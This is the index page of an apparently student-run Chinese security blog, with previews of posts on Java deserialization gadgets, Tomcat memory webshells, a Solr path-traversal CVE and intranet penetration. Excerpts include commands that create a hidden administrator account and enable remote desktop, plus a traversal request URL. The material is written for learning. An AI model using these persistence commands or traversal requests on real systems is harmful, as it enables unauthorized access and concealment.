fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/Java/">Java</a></span></div><div class="content">Java agent学习JVMTI （JVM Tool Interface）JVMTI （JVM Tool Interface）是Java虚拟机对外提供的Native编程接口，通过JVMTI，外部进程可以获取到运行时JVM的诸多信息，比如线程、GC等。Agent是一个运行在目标JVM的特定程序，它的职责是负责从目标JVM中获取数据，然后将数据传递给外部进程。加载Agent的时机可以是目标JVM启动之时，也可以是在目标JVM运行时进行加载，而在目标JVM运行时进行Agent加载具备动态性。
+JVM启动前javaagent参数javaagent是java命令的一个参数。改参数可指定一个jar包，一条java命令中可多次出现javaagent，对于jar包有下面两个要求：
+
+这个jar包的MANIFEST.MF文件必须指定Premain-Class项。
+Premain-Class指定的类必须有premain()方法。
+
+
+premain方法是中JVM启动时先于main函数运行的，JVM启动时会先运行-javaagent指定类的premain方法。
+
+同时javaagent命令要求指定的类必须 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/" title="内网渗透--远程桌面">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透--远程桌面"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/" title="内网渗透--远程桌面">内网渗透--远程桌面</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-04-29T12:05:01.000Z" title="Created 2021-04-29 20:05:01">2021-04-29</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a></span></div><div class="content">内网渗透–远程桌面前言学代码审计有些枯燥，加上俺内网啥也不会，学学内网换换口味。
+隐藏用户的创建因为在Windows环境下创建用户后面如果带入一个“$”符号，在net user时默认是不显示的。
+利用条件：获得管理员权限
+首先在cs中输入以下命令
+
+shell net user admin$ 123456 /add
+
+
+shell net localgroup administrators admin$ /add
+
+第一句是创建一个admin$用户密码为123456.第二句是将用户加入管理组。
+
+我们来验证一下，使用net user命令并无admin用户
+然后远程打开3389端口。
+
+reg add “HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+
+现在已经可以远程连接了，但是中用户组中依然可以看见admin$
+现在我们想办法把这里的admin$也隐藏掉
+利用 运行 输入regedit 打开注册表 ，找到如下图的SAM
+选择SAM ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/" title="内存马初探">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内存马初探"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/" title="内存马初探">内存马初探</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-04-18T10:05:01.000Z" title="Created 2021-04-18 18:05:01">2021-04-18</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/Java/">Java</a></span></div><div class="content">内存马初探-FilterTomcat简介tomcat其实质上就是一个大点的servlet容器，那什么是容器呢，我觉得其实就是一个类。在tomcat中各个容器之间嵌套。而这些容器都是有生命周期的java类，都继承了共同的接口Lifecycle，所以Lifecycle就是这些容器的顶层接口。下面来谈谈存在哪些容器。
+容器
+init()方法：初始化容器组件，它必须在启动容器之前调用。它会创建许多对象。
+start():启动容器，比如启动一个Server。
+stop()：停止执行
+destroy()：销毁这个容器。
+Server容器：一个StandardServer类实例就表示一个Server容器
+Service容器：一个StandardService类实例就表示一个Service容器
+Engine容器：一个StandardEngine类实例就表示一个Engine容器。
+Host容器：一个StandardHost类实例就表示一个Host容器。
+Context容器：一个StandardContext类实例就表示一个Context容器。
+Wrapper容器：一个StandardWrapper类实例 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/" title="solr漏洞分析--CVE-2017-3163">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="solr漏洞分析--CVE-2017-3163"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/" title="solr漏洞分析--CVE-2017-3163">solr漏洞分析--CVE-2017-3163</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-04-11T12:05:01.000Z" title="Created 2021-04-11 20:05:01">2021-04-11</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/Java/">Java</a></span></div><div class="content">solr漏洞分析–CVE-2017-3163环境搭建solr 6.4.0java 1.8
+solr 所有版本下载地址：http://archive.apache.org/dist/lucene/solr/
+启动低版本启动，在example目录下：
+
+java -Xdebug -Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=y -jar start.jar
+
+高版本启动,bin目录下：
+
+./solr.cmd -f -a “-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=10010” -port 8983 -s “./Solr/solr-6.4.0/example/example-DIH/solr”
+
+IDEA:
+复现影响范围
+1.4.0-6.4.0
+
+低版本：
+
+http://127.0.0.1:8983/solr/replication?command=filecontent&amp;file=../../../../../../../ ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/" title="CommonsCollections 3～7分析">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CommonsCollections 3～7分析"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/" title="CommonsCollections 3～7分析">CommonsCollections 3～7分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-04-05T10:44:01.000Z" title="Created 2021-04-05 18:44:01">2021-04-05</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/Java/">Java</a></span></div><div class="content">CommonsCollections 3~7分析前言看完了CC1和CC2后面的内容都简单的多了，所以就一起分析一下。
+CC3测试环境
+jdk1.7
+Commons Collections 4.0
+
+漏洞分析cc3和cc1和cc2蛮像的，就是cc1+cc2的变种，在cc3中引入了新的类TrAXFilter和InstantiateTransformer。在cc2中是利用InvokeTransform触发newTransFormer进行命令执行的，而在cc3中，则是通过TrAXFilter触发NewTransFormer进行命令执行的。
+public class TrAXFilter extends XMLFilterImpl &#123;
+    private Templates              _templates;
+    private TransformerImpl        _transformer;
+    private TransformerHandlerImpl _transformerHandler;
+    private boolean _useSe ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/" title="CommonsCollections 2分析">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CommonsCollections 2分析"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/" title="CommonsCollections 2分析">CommonsCollections 2分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-04-01T14:16:01.000Z" title="Created 2021-04-01 22:16:01">2021-04-01</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/Java/">Java</a></span></div><div class="content">CommonsCollections 2分析Javassistcc2的利用和cc1不同，这里用到了一个新的类库，可以允许开发者添加新的类和方法。下面来看看javassist的API文档的描述。
+The Javassist Core API.
+Javassist (Java programming assistant) makes bytecode engineering simple. It is a class library for editing bytecode in Java; it enables Java programs to define a new class at runtime and to modify a given class file when the JVM loads it.
+
+The most significant class of this package is CtClass. See the description of this class first.
+
+To know the version number of this packag ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/03/26/HW%E6%80%BB%E7%BB%93/" title="HW总结">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HW总结"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/26/HW%E6%80%BB%E7%BB%93/" title="HW总结">HW总结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-03-26T06:21:01.000Z" title="Created 2021-03-26 14:21:01">2021-03-26</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E9%97%B2%E8%B0%88/">闲谈</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%97%B2%E8%B0%88/">闲谈</a></span></div><div class="content">HW总结前言已经两个星期没有发文章了，因为前个星期在HW，身为一个大二的在校生，当要去HW当红队的时候，心里还是蛮紧张的。在那里包吃包住，而且酒店也挺好的，蛮开心的。从中也学到了很多，不过HW还是蛮累的，结束的那天十点就睡着啦，结果回来又有通知要打HW，此时我的心里是裂开的，又要醉生梦死了QAQ。
+历程第一天第一天主要是在信息搜集，打点。运气蛮好的，在对某个网站进行C段扫描，和端口扫描的时候，发现了一个薄弱点。这里就不得不吐槽一下，服务器是真的垃圾呀，在当天晚上直接崩了，我都啥都没干就下了个数据库备份文件。当场脑溢血，没办法，当时只能想着第二天再想想办法，看看管理员会不会重启一下服务器。
+第二天因为第一天晚上好不容易找到的服务器崩了，本来好不容易找到了mysql数据库的root权限账号密码，而且机缘巧合的该网站存在phpMyAdmin，结果网站炸了。第二天一大早起来，去看了看结果也还是依旧无法打开。哎，还能怎么办呢，只能重新再找一下看看有没有别的地方可以，结果找了一天无果。只有一些不痛不痒的小洞，还好，网站管理员在下午的时候，把网站又打开了，果断的利用phpMyAdmin写了一个web ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="page-number" href="/page/3/#content-inner">3</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsxjbgddgvj30u00u0gnx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name"></div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/York145"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/York145" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/2192557290@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">唯信仰与日月亘古不变</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/28/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" title="No title"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/2021/07/28/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" title="No title">No title</a><time datetime="2021-07-28T08:03:56.288Z" title="Created 2021-07-28 16:03:56">2021-07-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/" title="ATT&amp;CK红队评估实战靶场（一） 练习"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ATT&amp;CK红队评估实战靶场（一） 练习"/></a><div class="content"><a class="title" href="/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/" title="ATT&amp;CK红队评估实战靶场（一） 练习">ATT&amp;CK红队评估实战靶场（一） 练习</a><time datetime="2021-07-24T11:31:01.000Z" title="Created 2021-07-24 19:31:01">2021-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Shiro反序列化漏洞学习"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro反序列化漏洞学习"/></a><div class="content"><a class="title" href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Shiro反序列化漏洞学习">Shiro反序列化漏洞学习</a><time datetime="2021-06-13T11:16:01.000Z" title="Created 2021-06-13 19:16:01">2021-06-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" title="Java agent学习"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java agent学习"/></a><div class="content"><a class="title" href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" title="Java agent学习">Java agent学习</a><time datetime="2021-05-09T06:31:01.000Z" title="Created 2021-05-09 14:31:01">2021-05-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/" title="内网渗透--远程桌面"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透--远程桌面"/></a><div class="content"><a class="title" href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/" title="内网渗透--远程桌面">内网渗透--远程桌面</a><time datetime="2021-04-29T12:05:01.000Z" title="Created 2021-04-29 20:05:01">2021-04-29</time></div></div></div></div><div class="card-widget" id="card-newest-comments"><div class="item-headline"><i class="fas fa-comment-dots"></i><span>Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>Categories</span>
+            
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Java/"><span class="card-category-list-name">Java</span><span class="card-category-list-count">12</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/web/"><span class="card-category-list-name">web</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%86%85%E7%BD%91/"><span class="card-category-list-name">内网</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E8%BD%AC%E8%BD%BD/"><span class="card-category-list-name">转载</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E9%80%86%E5%90%91/"><span class="card-category-list-name">逆向</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E9%97%B2%E8%B0%88/"><span class="card-category-list-name">闲谈</span><span class="card-category-list-count">1</span></a></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>Tags</span></div><div class="card-tag-cloud"><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.22em; color: rgb(29, 11, 193)">内网</a><a href="/tags/%E6%82%A6%E8%AF%BB/" style="font-size: 1.45em; color: rgb(53, 52, 88)">悦读</a><a href="/tags/Java/" style="font-size: 1.38em; color: rgb(193, 190, 40)">Java</a><a href="/tags/%E9%97%B2%E8%B0%88/" style="font-size: 1.15em; color: rgb(83, 1, 193)">闲谈</a><a href="/tags/web/" style="font-size: 1.3em; color: rgb(191, 83, 93)">web</a><a href="/tags/java/" style="font-size: 1.22em; color: rgb(143, 71, 42)">java</a><a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 1.15em; color: rgb(100, 114, 150)">逆向</a><a href="/tags/%E8%BD%AC%E8%BD%BD/" style="font-size: 1.15em; color: rgb(126, 33, 118)">转载</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>Archives</span><a class="card-more-btn" href="/archives/" title="More">
+    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/07/"><span class="card-archive-list-date">七月 2021</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/06/"><span class="card-archive-list-date">六月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/05/"><span class="card-archive-list-date">五月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/04/"><span class="card-archive-list-date">四月 2021</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/03/"><span class="card-archive-list-date">三月 2021</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/02/"><span class="card-archive-list-date">二月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/11/"><span class="card-archive-list-date">十一月 2020</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/10/"><span class="card-archive-list-date">十月 2020</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article :</div><div class="item-count">22</div></div><div class="webinfo-item"><div class="item-name">UV :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">PV :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">Last Push :</div><div class="item-count" id="last-push-date" data-lastPushDate="2021-07-29T02:40:51.227Z"></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By null</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.17.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[image]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[link]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[code]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=monsterid'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += 'No Comment'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = () => {
+    const serverURL = 'https://0CCNA4v7.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": '0CCNA4v7N3NfIoztkmU8uOaf-gzGzoHsz',
+        "X-LC-Key": 'NI4yNO6pe0VGcyaXWOjKtYkk',
+        "Content-Type": "application/json"
+      },
+    }
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.innerHTML= "Unable to get the data, please make sure the settings are correct."
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
